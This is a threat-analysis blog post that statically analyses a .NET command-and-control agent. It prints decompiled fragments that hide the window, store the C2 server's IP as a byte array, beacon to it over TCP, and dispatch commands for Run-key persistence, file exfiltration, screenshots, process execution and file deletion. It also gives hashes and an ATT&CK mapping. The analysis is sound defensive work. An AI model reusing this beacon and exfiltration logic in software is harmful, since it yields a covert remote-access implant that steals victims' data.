<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        004 - Analyzing a C2 agent - Part 2: the agent
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="In this article, a direct continuation of the previous article, we analyze a C2 agent developed in .NET to identify how it evades defenses, the capabilities it offers, and how we can obtain indicators of compromise from it."
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/en/posts/004-analyzing-a-dotnet-c2-agent/" />
<link rel="me" href="https://infosec.exchange/@stapia"/>







<link rel="stylesheet" href="/css/style.css" />

<link rel="stylesheet" href="/style.css" />


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="004 - Analyzing a C2 agent - Part 2: the agent"/>
<meta name="twitter:description" content="In this article, a direct continuation of the previous article, we analyze a C2 agent developed in .NET to identify how it evades defenses, the capabilities it offers, and how we can obtain indicators of compromise from it."/>



<meta property="og:title" content="004 - Analyzing a C2 agent - Part 2: the agent" />
<meta property="og:description" content="In this article, a direct continuation of the previous article, we analyze a C2 agent developed in .NET to identify how it evades defenses, the capabilities it offers, and how we can obtain indicators of compromise from it." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/en/posts/004-analyzing-a-dotnet-c2-agent/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-26T12:05:50-05:00" />
<meta property="article:modified_time" content="2023-12-26T12:05:50-05:00" /><meta property="og:site_name" content="Threat Anatomy Blog" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Threat Anatomy Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/en/contact">Contact</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/en/contact">Contact</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
        <span>
        <ul class="i18n">
          
            
              
              
                
                <li><a title="Spanish" href="/es/posts/004-analyzing-a-dotnet-c2-agent/"><img id="trans-flag" src=/img/flag-spain.png alt="Spanish" /></a></li>
              
            
          
        </ul>
      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <article class="post">
    <h1 class="post-title">004 - Analyzing a C2 agent - Part 2: the agent</h1>
    <div class="post-meta">
      
        <time class="post-date">
          2023-12-26
        </time>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 10 min read</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <p><em>Este artículo también está disponible en <a href="/es/posts/004-analyzing-a-dotnet-c2-agent/">español</a></em></p>
<h2 id="1-introduction">
  1. Introduction
  <a href="#1-introduction" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>In <a href="/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">the first part of this article</a> we identified that, after implementing certain techniques to make detection more difficult, the malicious macro we analyzed extracted and executed an embedded .exe binary. In this part, we will analyze said binary statically to understand how it works, how we determine that it corresponds to a C2 agent, and what indicators of compromise we can obtain from it.</p>
<p>Due to the length of the article, we will evaluate the binary dynamically in a third installment.</p>
<blockquote>
<p><strong>Disclaimer</strong>: Running malware on a personal or corporate device can put your information/your company&rsquo;s information at risk. Never run malware on a device that has not been specifically configured for malware analysis.</p>
</blockquote>
<h2 id="2-static-analysis-of-the-executable">
  2. Static analysis of the executable
  <a href="#2-static-analysis-of-the-executable" class="h-anchor" aria-hidden="true">#</a>
</h2>
<h3 id="21-identifying-the-binarys-hashes-and-the-development-framework-it-uses">
  2.1 Identifying the binary&rsquo;s hashes and the development framework it uses
  <a href="#21-identifying-the-binarys-hashes-and-the-development-framework-it-uses" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>We start the analysis by obtaining the hash of the executable:</p>
<table>
<thead>
<tr>
<th>Algorithm</th>
<th>Hash</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5</td>
<td>59211a4e0f27d70c659636746b61945a</td>
</tr>
<tr>
<td>SHA256</td>
<td>2110af4e9c7a4f7a39948cdd696fcd8b 4cdbb7a6a5bf5c5a277b779cc1bf8577</td>
</tr>
</tbody>
</table>
<p>After opening the binary in <a href="https://www.winitor.com/download">PEStudio</a>, we see some interesting things:</p>
<p><img src="/img/004-pestudio1.png" alt="alt text" title="PEStudio Analysis"></p>
<ol>
<li>PEStudio identifies the binary as of &ldquo;Microsoft .NET&rdquo; type.</li>
<li>The binary appears to have been compiled on September 05 2023, so it is recent (this value can be altered so it is not 100% reliable).</li>
<li>The path to the &ldquo;debug&rdquo; file of the binary is identified, which contains \obj\Debug, a standard directory created by Visual Studio.</li>
</ol>
<p>These factors seem to suggest that it is a .NET program; additionally, by analyzing some of the other sections provided by PEStudio we can get further confirmation of this:</p>
<p><img src="/img/004-pestudio2.png" alt="alt text" title="PEStudio Indicators"></p>
<p><img src="/img/004-pestudio3.png" alt="alt text" title="PEStudio Imports"></p>
<ol>
<li>PEStudio identifies the .NET namespace System.Net.Socket</li>
<li>PEStudio identifies that the program, during its execution, imports <a href="https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0">.NET classes</a></li>
</ol>
<p>With this information, we can say with near total certainty that the binary corresponds to one developed with the .NET framework. Additionally, we see that PEStudio identifies an IP, which may be an indicator of compromise (IOC) of interest.</p>
<h3 id="decompilation-of-net-binaries">
  Decompilation of .NET binaries
  <a href="#decompilation-of-net-binaries" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Programs developed in .NET are usually susceptible to decompilation because they are not compiled directly to the binary machine language that the computer understands (the 0&rsquo;s and 1&rsquo;s). Instead, they are compiled to an intermediate language (IL), which is converted during the program&rsquo;s execution to the specific machine language of the environment in which it is running.</p>
<p>Although this framework provides flexibility, the intermediate language contains information about classes names, methods, metadata, etc., which allows it to be decompiled and thus, &ldquo;reverted&rdquo; almost to its original form.</p>
<p>There are different tools that allow decompiling a binary created in .NET, among them <a href="https://github.com/icsharpcode/ILSpy"><em>ILSpy</em></a> and <a href="https://github.com/dnSpy/dnSpy"><em>dnSpy</em></a>; for this analysis I will use <em>dnSpy</em> due to the debugging capabilities it offers.</p>
<h3 id="22-initial-analysis-of-the-binary">
  2.2 Initial analysis of the binary
  <a href="#22-initial-analysis-of-the-binary" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>When we open the executable in <em>dnSpy</em>, we validate that we can indeed visualize the code:</p>
<p><img src="/img/004-dnspy.png" alt="alt text" title="dnSpy"></p>
<p>Since analyzing each function called by the executable can be very tedious (specially if it contains garbage code to hinder analysis), we will follow the flow of calls made from the Main method.</p>
<ol>
<li>We verify that when the program starts it calls the Form1 form, which, when initialized, invokes the <strong>InitializeComponent()</strong> method. From this method&rsquo;s configuration we can gather three things:
<ol>
<li>The opacity of the form is set to 0 to make it invisible.</li>
<li>The form is configured not to have an icon in the taskbar.</li>
<li>The method <strong>Form1_Load</strong> is called.</li>
</ol>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> InitializeComponent()
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.Name = <span style="color:#e6db74">&#34;Form1&#34;</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.Opacity = <span style="color:#ae81ff">0.0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.ShowIcon = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.ShowInTaskbar = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.Text = <span style="color:#e6db74">&#34;Form1&#34;</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.FormClosing += <span style="color:#66d9ef">this</span>.Form1_FormClosing;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">base</span>.Load += <span style="color:#66d9ef">this</span>.Form1_Load;
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><ol start="2">
<li>The <strong>Form1_Load</strong> method stops execution (&ldquo;sleeps&rdquo;) for a few seconds before calling the <strong>corediQart()</strong> method:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Form1_Load(<span style="color:#66d9ef">object</span> sender, EventArgs e)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				Thread.Sleep(<span style="color:#ae81ff">1010</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">base</span>.ShowInTaskbar = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">base</span>.Visible = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">base</span>.FormBorderStyle = FormBorderStyle.SizableToolWindow;
</span></span><span style="display:flex;"><span>				Thread.Sleep(<span style="color:#ae81ff">2050</span>);
</span></span><span style="display:flex;"><span>				Thread.Sleep(<span style="color:#ae81ff">1280</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">this</span>.mainvp.corediQart();
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">catch</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><p>This technique (<a href="https://attack.mitre.org/techniques/T1497/003/">T1497.003</a>) is usually used by attackers to evade dynamic analysis tools, many of which are only active for a short period of time and may believe that a binary does not have malicious behavior just because it is not yet executed. In this case, from my point of view, the times are too short to be useful for this technique, so they are probably to give time to other components of the program to finish loading.</p>
<ol start="3">
<li>The <strong>corediQart()</strong> method performs the following actions:
<ol>
<li>Assigns the first port defined in the <em>ports</em> variable to the <em>port</em> variable.</li>
<li>Gets the name of the computer where the program is running, as well as the user running the program and assigns it to the <em>userAiunt</em> variable.</li>
<li>Creates an object of type <em>TimerCallback</em> that calls the <strong>procvQloop</strong> method.</li>
<li>Set the object of type <em>TimerCallback</em> to run every 58.51 seconds, after initially waiting 49.12 seconds.</li>
</ol>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> corediQart()
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			DIRERRIF.port = DIRERRIF.ports[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.userAiunt = <span style="color:#66d9ef">new</span> MRDFINF();
</span></span><span style="display:flex;"><span>			...
</span></span><span style="display:flex;"><span>			TimerCallback callback = <span style="color:#66d9ef">new</span> TimerCallback(<span style="color:#66d9ef">this</span>.procvQloop);
</span></span><span style="display:flex;"><span>			Timer timer = <span style="color:#66d9ef">new</span> Timer(callback, <span style="color:#66d9ef">this</span>.objeAdate, <span style="color:#ae81ff">49120</span>, <span style="color:#ae81ff">58510</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.objeAdate.timer = timer;
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[] ports = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[]
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">9149</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">15198</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">17818</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">27781</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">29224</span>
</span></span><span style="display:flex;"><span>		};
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> MRDFINF()
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			...
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.comtname = SystemInformation.ComputerName;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.acc_datQtime = Environment.UserName;
</span></span><span style="display:flex;"><span>			...
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><ol start="4">
<li>Analyzing what the <strong>procvQloop()</strong> method does, it initiates a TCP connection with the IP stored in the <em>min_codns</em> variable; in that variable, the IP is stored as a set of bytes, probably to make detection more difficult:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>DIRERRIF.mainwtp = Encoding.UTF8.GetString(DIRERRIF.min_codns, <span style="color:#ae81ff">0</span>, DIRERRIF.min_codns.Length).ToString();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.maiedet = <span style="color:#66d9ef">new</span> TcpClient();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.maiedet.Connect(DIRERRIF.mainwtp, DIRERRIF.port);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] min_codns = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[]
</span></span><span style="display:flex;"><span>{<span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">55</span>};
</span></span></code></pre></div><p>The TCP connection is established with the IP stored in the <em>min_codns</em> variable on the port assigned to the <em>port</em> variable.</p>
<ol start="5">
<li>Once the connection is made, if successful, the <strong>procD_core()</strong> method is called, which performs multiple operations:
<ol>
<li>Gets a response from the previously established TCP connection.</li>
<li>Separate the obtained answer using the &lsquo;=&rsquo; separator.</li>
<li>Based on the first value of the answer (what was before the &lsquo;=&rsquo;) it calls different methods.</li>
</ol>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> procD_core()
</span></span><span style="display:flex;"><span>        ...
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span>[] procss_type = <span style="color:#66d9ef">this</span>.get_procsQtype();
</span></span><span style="display:flex;"><span>		...
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> text = procss_type[<span style="color:#ae81ff">0</span>].ToLower();
</span></span><span style="display:flex;"><span>		...
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;thyTumb&#34;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.imagiQtails(procss_type[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;scyTrsz&#34;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.dsAscrnsize(procss_type[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span>[] get_procsQtype()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span>[] result;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">byte</span>[] array = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">5</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span>.byteAdesr = <span style="color:#66d9ef">this</span>.newWam.Read(array, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> num = BitConverter.ToInt32(array, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">byte</span>[] array2 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[num];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> num2 = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = num; i &gt; <span style="color:#ae81ff">0</span>; i -= <span style="color:#66d9ef">this</span>.byteAdesr)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> count = (i &gt; <span style="color:#66d9ef">this</span>.bufeAize) ? <span style="color:#66d9ef">this</span>.bufeAize : i;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">this</span>.byteAdesr = <span style="color:#66d9ef">this</span>.newWam.Read(array2, num2, count);
</span></span><span style="display:flex;"><span>			num2 += <span style="color:#66d9ef">this</span>.byteAdesr;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> text = Encoding.UTF8.GetString(array2, <span style="color:#ae81ff">0</span>, num).ToString();
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (text.Trim() == <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			result = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			result = text.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[]
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#e6db74">&#39;=&#39;</span>
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Without analyzing the rest of the functions, the behavior of the program already suggests that it might be a C2 agent:</p>
<ol>
<li>Every so often (approximately every minute), it communicates with a server using a non-common IP and a non-common port.</li>
<li>It receives a response from the server, which is composed of two sections.</li>
<li>Based on the first section (commands), it calls methods by passing them the second section (payload/command parameters).</li>
</ol>
<p>Based on this analysis we can assume that the server sends commands to the agent, which executes them. Further analysis will allow us to confirm if it is really a Command and Control agent, as well as the capabilities that this agent has.</p>
<h3 id="23-analysis-of-c2-agent-functions">
  2.3 Analysis of C2 agent functions
  <a href="#23-analysis-of-c2-agent-functions" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Since analyzing each function would be very tedious, we will analyze some functions that I found interesting:</p>
<h4 id="231-list-processes">
  2.3.1 List processes
  <a href="#231-list-processes" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>As in the macro containing the binary, the use of underscores to separate commands/variables is seen:</p>
<p><img src="/img/004-lp1.png" alt="alt text" title="Obfuscation"></p>
<p>When the &ldquo;geyTtavs&rdquo; command is received, the processes running on the system are obtained and their ID and name are sent to the server using the <strong>loadQData</strong> function:</p>
<p><img src="/img/004-lp2.png" alt="alt text" title="List Processes"></p>
<p>The <strong>loadQData</strong> function sends the type of response to expect, the size of the response and the response to the server.</p>
<p>Just by analyzing the &ldquo;list processes&rdquo; function, we can confirm that it is indeed a Command and Control agent: the program contacts a server, receives an instruction (list processes in this case) and sends the response to the server.</p>
<h4 id="232-establish-persistence">
  2.3.2 Establish persistence
  <a href="#232-establish-persistence" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>The registry key <em>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</em> is usually abused by attackers to establish persistence; such technique is <a href="https://attack.mitre.org/techniques/T1547/001/">listed in MITRE ATT&amp;CK with ID T1547.001</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys">allows an attacker to run a program when the user logs in</a>, under the context (permissions) of that user.</p>
<p>We verify that the agent provides the capability to establish persistence. On receiving the command &ldquo;puyTtsrt&rdquo; it creates the registry key with name &ldquo;haijwivetsgVr&rdquo;:</p>
<p><img src="/img/004-pers1.png" alt="alt text" title="Establish persistence 1"></p>
<p><img src="/img/004-pers2.png" alt="alt text" title="Establish persistence 2"></p>
<p><img src="/img/004-pers3.png" alt="alt text" title="Establish persistence 3"></p>
<p>As before, we see that the path name in the registry has been split using underscores to make identification more difficult.</p>
<h4 id="233-list-files">
  2.3.3 List files
  <a href="#233-list-files" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>Upon receiving the &ldquo;flyTes&rdquo; command along with a path, the command lists the files in the path using the <strong>Directory.GetFiles</strong> method, concatenates them using the character &lsquo;&gt;&rsquo; as a separator and sends them to the server:</p>
<p><img src="/img/004-listfiles.png" alt="alt text" title="Listing files"></p>
<p><img src="/img/004-listfiles2.png" alt="alt text" title="Read directory"></p>
<h4 id="234-take-screenshots">
  2.3.4 Take screenshots
  <a href="#234-take-screenshots" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>The &ldquo;cdyTcrgn&rdquo;, &ldquo;csyTcrgn&rdquo; and &ldquo;csyTdcrgn&rdquo; commands can be used to take screenshots and send them to the server:</p>
<p><img src="/img/004-sc1.png" alt="alt text" title="Screen capture 1"></p>
<p><img src="/img/004-sc2.png" alt="alt text" title="Screen capture 2"></p>
<p><img src="/img/004-sc3.png" alt="alt text" title="Screen capture 3"></p>
<h4 id="235-file-exfiltration">
  2.3.5 File exfiltration
  <a href="#235-file-exfiltration" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>The &ldquo;afyTile&rdquo; command can be used to exfiltrate a file from the victim&rsquo;s machine to the server; to do so, it receives the path of the file to exfiltrate as a parameter:</p>
<p><img src="/img/004-exfilb.png" alt="alt text" title="File exfiltration"></p>
<p><img src="/img/004-exfila.png" alt="alt text" title="File exfiltration 2"></p>
<p>The information sent back to the server includes the file path, the file name and the contents of the file.</p>
<h4 id="236-execute-binaries">
  2.3.6 Execute binaries
  <a href="#236-execute-binaries" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>To execute a program that already exists in the system (either native or downloaded with another command), the &ldquo;ruyTnf&rdquo; command is used, which starts a new process receiving as a parameter the name of the program to be executed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;ruyTnf&#34;</span>) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>    Process.Start(procss_type[<span style="color:#ae81ff">1</span>].Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[] { <span style="color:#e6db74">&#39;&gt;&#39;</span> })[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="237-delete-a-file">
  2.3.7 Delete a file
  <a href="#237-delete-a-file" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>The &ldquo;deyTlt&rdquo; command receives as a parameter the path where a file is stored, and then uses the <strong>File.Delete</strong> method to delete it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;deyTlt&#34;</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.trasQfiles(procss_type[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> trasQfiles(<span style="color:#66d9ef">string</span> path) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    File.Delete(path);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="3-conclusions">
  3. Conclusions
  <a href="#3-conclusions" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>When I started writing this article I thought it would be the final part of the analysis; however, after identifying the number of functions that the agent exposed, I preferred to go into detail on some of them and leave the dynamic analysis for the next article.</p>
<p>The analyzed malware has all the characteristics of a Command and Control agent: it contacts the server from time to time, allows obtaining information from the system, allows exfiltrating information, allows downloading binaries to the system and executing them, among other functions.</p>
<p>The malware uses a couple of techniques to bypass static code analysis tools: the use of underscores to alter variable names/registry keys, as well as the use of a byte array to store an IP instead of storing it in plaintext; however, the fact that it has been developed in .NET allows for easy decompilation and analysis.</p>
<p>In the next article I will elaborate on how someone can interact with the malware as part of their analysis, and thus evidence whether it has any unidentified behavior not identified as part of the static analysis.</p>
<h2 id="4-mitre-attck-mapping">
  4. MITRE ATT&amp;CK Mapping
  <a href="#4-mitre-attck-mapping" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>ID</th>
<th>Tactic</th>
<th>Technique</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>T1059.003</td>
<td>Execution</td>
<td>Command and Scripting Interpreter: Windows Command Shell</td>
<td>The method Process.Start was used to initiate new processes</td>
</tr>
<tr>
<td>T1547.001</td>
<td>Persistence</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td>
<td>A registry key was used to stablish persistence</td>
</tr>
